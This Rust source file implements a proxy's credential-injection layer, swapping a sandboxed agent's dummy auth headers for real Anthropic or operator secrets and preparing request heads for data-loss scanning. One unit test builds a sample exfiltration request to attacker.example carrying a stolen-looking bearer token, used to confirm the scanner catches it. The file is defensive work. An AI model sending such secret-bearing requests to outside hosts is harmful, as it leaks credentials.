//! Credential injection — secrets live ONLY in Warden (and the orchestrator secret store),
//! never in the sandbox. On a MITM'd request to a scoped host we strip the sandbox's dummy
//! auth header and inject the real one into the decrypted head.
//!
//! Two hot-reloaded sources (so a rotation reaches a long-lived keep-alive tunnel without a
//! restart): WARDEN_CRED — the managed Anthropic credential, applied to the Anthropic hosts;
//! and WARDEN_SECRETS — operator-defined secrets mapping host scopes to an arbitrary header
//! + value. The Anthropic credential always wins on its own hosts.
use serde::Deserialize;
use std::collections::HashMap;
use std::sync::RwLock;
use std::time::SystemTime;

#[derive(Clone)]
pub enum Credential {
    ApiKey(String),         // x-api-key: …             (Anthropic API key)
    Bearer(String),         // authorization: Bearer …  (subscription OAuth token)
    Header(String, String), // <name>: <value>          (operator-defined secret; name lowercased)
}

impl Credential {
    fn header_line(&self) -> String {
        match self {
            Credential::ApiKey(k) => format!("x-api-key: {k}"),
            Credential::Bearer(t) => format!("authorization: Bearer {t}"),
            Credential::Header(n, v) => format!("{n}: {v}"),
        }
    }
    /// The (lowercased) header name this credential sets. Stripped from the sandbox dummy
    /// and from the DLP scan so the injected value is neither duplicated nor scanned.
    fn header_name(&self) -> &str {
        match self {
            Credential::ApiKey(_) => "x-api-key",
            Credential::Bearer(_) => "authorization",
            Credential::Header(n, _) => n,
        }
    }
}

const STRIP: &[&str] = &["authorization", "x-api-key"]; // sandbox dummies always dropped

fn line_header_name(line: &str) -> String {
    line.split(':').next().unwrap_or("").trim().to_lowercase()
}

/// The request head with credential headers removed — for DLP scanning only.
///
/// `extra` is the credential for the matched host, or `None` on a host we do NOT inject into
/// (e.g. an `inspect`-only rule). The strip is conditional on injection: on an injected host the
/// sandbox's auth header is a decoy (or the slot we overwrite) and would self-trigger the
/// secret-exfil patterns on every legit call, so we drop it. On a NON-injected host we keep
/// auth headers — an `Authorization: Bearer <stolen-secret>` / `X-Api-Key: <secret>` sent there
/// is a real exfil channel, and enforce-mode `dlp-block` depends on the scan seeing it. The rest
/// of the exfil surface — body, path, other headers — is always preserved.
pub fn strip_auth_for_scan(head: &[u8], extra: Option<&Credential>) -> Vec<u8> {
    let extra_name = extra.map(|c| c.header_name().to_string());
    let strip_auth = extra.is_some(); // only on credential-injected hosts
    let text = String::from_utf8_lossy(head);
    text.split("\r\n")
        .filter(|line| {
            let name = line_header_name(line);
            let stripped = (strip_auth && STRIP.contains(&name.as_str()))
                || extra_name.as_deref() == Some(name.as_str());
            !stripped
        })
        .collect::<Vec<_>>()
        .join("\r\n")
        .into_bytes()
}

#[derive(Deserialize)]
struct CredFile {
    #[serde(rename = "type", default)]
    kind: String,
    #[serde(default)]
    value: String,
    #[serde(default)]
    disabled: bool,
}
fn parse_cred(kind: &str, value: String) -> Option<Credential> {
    match kind {
        "bearer" | "oauth" | "subscription" => Some(Credential::Bearer(value)),
        "apikey" | "api_key" => Some(Credential::ApiKey(value)),
        _ => None,
    }
}

/// Outer None = invalid/torn file (retain last-good); Some(None) = explicit
/// operator revocation; Some(Some(_)) = usable credential.
fn parse_cred_file(txt: &str) -> Option<Option<Credential>> {
    let cf: CredFile = serde_json::from_str(txt).ok()?;
    if cf.disabled {
        return Some(None);
    }
    parse_cred(&cf.kind, cf.value).map(Some)
}

/// WARDEN_SECRETS: operator-defined secrets. The orchestrator has already applied any value
/// template (e.g. "Bearer {value}"), so `value` is the final, ready-to-send header value —
/// Warden stays dumb about templating.
#[derive(Deserialize)]
struct SecretRule {
    hosts: Vec<String>,
    header: String,
    value: String,
}
#[derive(Deserialize)]
struct SecretsFile {
    #[serde(default)]
    secrets: Vec<SecretRule>,
}
fn parse_secrets(txt: &str) -> Option<HashMap<String, Credential>> {
    let f: SecretsFile = serde_json::from_str(txt).ok()?;
    let mut map = HashMap::new();
    for r in f.secrets {
        let header = r.header.trim().to_lowercase();
        let valid_header = !header.is_empty() && header.bytes().all(|b| {
            b.is_ascii_alphanumeric() || b"!#$%&'*+-.^_`|~".contains(&b)
        });
        if !valid_header || r.value.is_empty() || r.value.contains('\r') || r.value.contains('\n') {
            continue;
        }
        for h in r.hosts {
            let host = h.trim().to_lowercase();
            if !host.is_empty() {
                map.insert(host, Credential::Header(header.clone(), r.value.clone()));
            }
        }
    }
    Some(map)
}

fn file_mtime(path: &str) -> Option<SystemTime> {
    std::fs::metadata(path).ok().and_then(|md| md.modified().ok())
}

pub struct Injector {
    cred_path: Option<String>,                       // WARDEN_CRED (managed Anthropic credential)
    secrets_path: Option<String>,                    // WARDEN_SECRETS (operator-defined secrets)
    static_rules: HashMap<String, Credential>,       // WARDEN_INJECT — fixed at startup
    rules: RwLock<HashMap<String, Credential>>,      // resolved: static + secrets + Anthropic
    cred_mtime: RwLock<Option<SystemTime>>,
    secrets_mtime: RwLock<Option<SystemTime>>,
    last_cred: RwLock<Option<Credential>>,           // last-good Anthropic credential
    last_secrets: RwLock<HashMap<String, Credential>>, // last-good operator secrets (host->cred)
}
impl Injector {
    pub fn from_env() -> Self {
        // WARDEN_INJECT: {"host":{"type":..,"value":..}} — extra per-host creds (MCP / tests)
        let mut static_rules = HashMap::new();
        if let Ok(j) = std::env::var("WARDEN_INJECT") {
            if let Ok(map) = serde_json::from_str::<HashMap<String, CredFile>>(&j) {
                for (h, cf) in map {
                    if let Some(c) = parse_cred(&cf.kind, cf.value) {
                        static_rules.insert(h.to_lowercase(), c);
                    }
                }
            }
        }
        let inj = Injector {
            cred_path: std::env::var("WARDEN_CRED").ok(),
            secrets_path: std::env::var("WARDEN_SECRETS").ok(),
            static_rules,
            rules: RwLock::new(HashMap::new()),
            cred_mtime: RwLock::new(None),
            secrets_mtime: RwLock::new(None),
            last_cred: RwLock::new(None),
            last_secrets: RwLock::new(HashMap::new()),
        };
        inj.reload();
        inj.rebuild(); // apply static_rules even when neither file is present
        inj
    }

    /// Re-read the (changed) source files. The orchestrator rotates/updates these for RUNNING
    /// sessions, so a refreshed token or an edited secret reaches Warden without a restart.
    /// A torn read (mid-write) keeps the LAST-GOOD value and does NOT advance mtime, so the
    /// next request retries — never dropping a live credential and 401-storming the agent.
    pub fn reload(&self) {
        let mut changed = false;
        if let Some(path) = &self.cred_path {
            if let Some(m) = file_mtime(path) {
                if Some(m) != *self.cred_mtime.read().unwrap_or_else(|e| e.into_inner()) {
                    if let Some(c) = std::fs::read_to_string(path)
                        .ok()
                        .and_then(|t| parse_cred_file(&t))
                    {
                        *self.last_cred.write().unwrap_or_else(|e| e.into_inner()) = c;
                        *self.cred_mtime.write().unwrap_or_else(|e| e.into_inner()) = Some(m);
                        changed = true;
                    }
                }
            }
        }
        if let Some(path) = &self.secrets_path {
            if let Some(m) = file_mtime(path) {
                if Some(m) != *self.secrets_mtime.read().unwrap_or_else(|e| e.into_inner()) {
                    if let Some(map) =
                        std::fs::read_to_string(path).ok().and_then(|t| parse_secrets(&t))
                    {
                        *self.last_secrets.write().unwrap_or_else(|e| e.into_inner()) = map;
                        *self.secrets_mtime.write().unwrap_or_else(|e| e.into_inner()) = Some(m);
                        changed = true;
                    }
                }
            }
        }
        if changed {
            self.rebuild();
        }
    }

    fn rebuild(&self) {
        let mut rules = self.static_rules.clone();
        for (h, c) in self.last_secrets.read().unwrap_or_else(|e| e.into_inner()).iter() {
            rules.insert(h.clone(), c.clone());
        }
        // The managed Anthropic credential always wins on its own hosts (an operator secret
        // can never shadow or misdirect it).
        if let Some(c) = self.last_cred.read().unwrap_or_else(|e| e.into_inner()).clone() {
            for h in crate::policy::ANTHROPIC_HOSTS {
                rules.insert(h.to_string(), c.clone());
            }
        }
        *self.rules.write().unwrap_or_else(|e| e.into_inner()) = rules;
    }

    pub fn get(&self, host: &str) -> Option<Credential> {
        self.rules.read().unwrap_or_else(|e| e.into_inner()).get(&host.to_lowercase()).cloned()
    }
}

/// Drop the sandbox's dummy auth header (and the slot we inject into) and add the real one.
pub fn rewrite_head(head: &[u8], cred: &Credential) -> Vec<u8> {
    let text = String::from_utf8_lossy(head);
    let lines: Vec<&str> = text.split("\r\n").collect();
    let mut out: Vec<String> = Vec::with_capacity(lines.len() + 1);
    if let Some(req) = lines.first() {
        out.push((*req).to_string());
    }
    let drop_name = cred.header_name();
    for line in lines.iter().skip(1) {
        if line.is_empty() {
            out.push(cred.header_line()); // inject at the head/body boundary
            break;
        }
        let name = line_header_name(line);
        if STRIP.contains(&name.as_str()) || name == drop_name {
            continue; // drop the dummy / the slot we're injecting into
        }
        out.push((*line).to_string());
    }
    let mut joined = out.join("\r\n");
    joined.push_str("\r\n\r\n");
    joined.into_bytes()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn injector_for(cred: Option<&str>, secrets: Option<&str>) -> (Injector, std::path::PathBuf) {
        let dir = std::env::temp_dir().join(format!("warden-inj-{}-{:?}", std::process::id(), std::thread::current().id()));
        std::fs::create_dir_all(&dir).unwrap();
        let cred_path = cred.map(|c| {
            let p = dir.join("cred.json");
            std::fs::write(&p, c).unwrap();
            p.to_string_lossy().into_owned()
        });
        let secrets_path = secrets.map(|s| {
            let p = dir.join("secrets.json");
            std::fs::write(&p, s).unwrap();
            p.to_string_lossy().into_owned()
        });
        let inj = Injector {
            cred_path,
            secrets_path,
            static_rules: HashMap::new(),
            rules: RwLock::new(HashMap::new()),
            cred_mtime: RwLock::new(None),
            secrets_mtime: RwLock::new(None),
            last_cred: RwLock::new(None),
            last_secrets: RwLock::new(HashMap::new()),
        };
        inj.reload();
        inj.rebuild();
        (inj, dir)
    }

    #[test]
    fn replaces_dummy_preserves_framing() {
        let head = b"POST /v1/messages HTTP/1.1\r\nHost: api.anthropic.com\r\nAuthorization: Bearer DUMMY\r\nContent-Length: 5\r\n\r\n";
        let s = String::from_utf8(rewrite_head(head, &Credential::Bearer("REAL".into()))).unwrap();
        assert!(s.contains("authorization: Bearer REAL"));
        assert!(!s.contains("DUMMY"));
        assert!(s.contains("Content-Length: 5"));
        assert!(s.ends_with("\r\n\r\n"));
        let s2 = String::from_utf8(rewrite_head(head, &Credential::ApiKey("sk-9".into()))).unwrap();
        assert!(s2.contains("x-api-key: sk-9") && !s2.contains("DUMMY"));
    }

    #[test]
    fn injects_arbitrary_header_secret() {
        // operator secret: set Authorization for github, X-Custom for another host.
        let head = b"GET /repos HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: Bearer DUMMY\r\nAccept: */*\r\n\r\n";
        let cred = Credential::Header("authorization".into(), "Bearer ghp_REAL".into());
        let s = String::from_utf8(rewrite_head(head, &cred)).unwrap();
        assert!(s.contains("authorization: Bearer ghp_REAL"));
        assert!(!s.contains("DUMMY"));          // sandbox dummy replaced
        assert!(s.contains("Accept: */*"));     // unrelated header kept
        // a non-auth header name is dropped if the sandbox sent a decoy of it
        let head2 = b"GET / HTTP/1.1\r\nHost: x\r\nX-Api-Token: decoy\r\n\r\n";
        let c2 = Credential::Header("x-api-token".into(), "real-token".into());
        let s2 = String::from_utf8(rewrite_head(head2, &c2)).unwrap();
        assert!(s2.contains("x-api-token: real-token") && !s2.contains("decoy"));
    }

    #[test]
    fn secrets_file_resolves_per_host_and_anthropic_wins() {
        let secrets = r#"{"secrets":[
            {"hosts":["api.github.com","ghcr.io"],"header":"Authorization","value":"Bearer ghp_X"},
            {"hosts":["api.anthropic.com"],"header":"authorization","value":"Bearer HIJACK"}
        ]}"#;
        let cred = r#"{"type":"bearer","value":"REAL"}"#;
        let (inj, dir) = injector_for(Some(cred), Some(secrets));
        // operator secret applied to its scoped hosts
        assert!(matches!(inj.get("api.github.com"), Some(Credential::Header(ref n, ref v)) if n == "authorization" && v == "Bearer ghp_X"));
        assert!(matches!(inj.get("ghcr.io"), Some(Credential::Header(..))));
        // a secret that tries to scope an Anthropic host CANNOT shadow the managed cred
        assert!(matches!(inj.get("api.anthropic.com"), Some(Credential::Bearer(ref t)) if t == "REAL"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn strip_auth_for_scan_drops_cred_and_injected_headers() {
        let head = b"POST /r HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: Bearer DECOY\r\nX-Api-Token: sk-DECOY\r\nContent-Type: application/json\r\n\r\n";
        // default STRIP removes Authorization; `extra` removes the injected custom header too
        let extra = Credential::Header("x-api-token".into(), "real".into());
        let scanned = String::from_utf8(strip_auth_for_scan(head, Some(&extra))).unwrap();
        assert!(!scanned.to_lowercase().contains("authorization"));
        assert!(!scanned.to_lowercase().contains("x-api-token"));
        assert!(!scanned.contains("DECOY"));
        assert!(scanned.contains("POST /r"));
        assert!(scanned.contains("Content-Type"));
    }

    #[test]
    fn strip_auth_for_scan_keeps_auth_on_noninject_host() {
        // On a host we do NOT inject into (cred == None), auth headers are the exfil channel and
        // MUST reach the scanner — otherwise a stolen secret leaves via `Authorization: Bearer …`
        // to an inspect-only host and enforce-mode dlp-block never fires. (Regression guard.)
        let head = b"POST /r HTTP/1.1\r\nHost: attacker.example\r\nAuthorization: Bearer sk-ant-STOLEN\r\nX-Api-Key: leaked\r\n\r\n";
        let scanned = String::from_utf8(strip_auth_for_scan(head, None)).unwrap();
        assert!(scanned.contains("sk-ant-STOLEN"), "auth header must survive on a non-inject host");
        assert!(scanned.to_lowercase().contains("x-api-key"));
        assert!(scanned.contains("leaked"));
    }

    #[test]
    fn reload_keeps_last_good_on_torn_read() {
        let (inj, dir) = injector_for(Some(r#"{"type":"bearer","value":"REAL"}"#), None);
        let host = crate::policy::ANTHROPIC_HOSTS[0];
        assert!(matches!(inj.get(host), Some(Credential::Bearer(ref t)) if t == "REAL"));
        // half-written file; force past the mtime gate
        let path = dir.join("cred.json");
        std::fs::write(&path, "{\"type\":\"bea").unwrap();
        *inj.cred_mtime.write().unwrap_or_else(|e| e.into_inner()) = None;
        inj.reload();
        assert!(matches!(inj.get(host), Some(Credential::Bearer(ref t)) if t == "REAL"), "torn read must keep last-good");
        assert!(inj.cred_mtime.read().unwrap_or_else(|e| e.into_inner()).is_none());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn explicit_revocation_clears_last_good() {
        let (inj, dir) = injector_for(Some(r#"{"type":"bearer","value":"REAL"}"#), None);
        let host = crate::policy::ANTHROPIC_HOSTS[0];
        assert!(inj.get(host).is_some());
        std::fs::write(dir.join("cred.json"), r#"{"disabled":true}"#).unwrap();
        *inj.cred_mtime.write().unwrap_or_else(|e| e.into_inner()) = None;
        inj.reload();
        assert!(inj.get(host).is_none(), "revocation must remove the in-memory last-good credential");
        let _ = std::fs::remove_dir_all(&dir);
    }
}
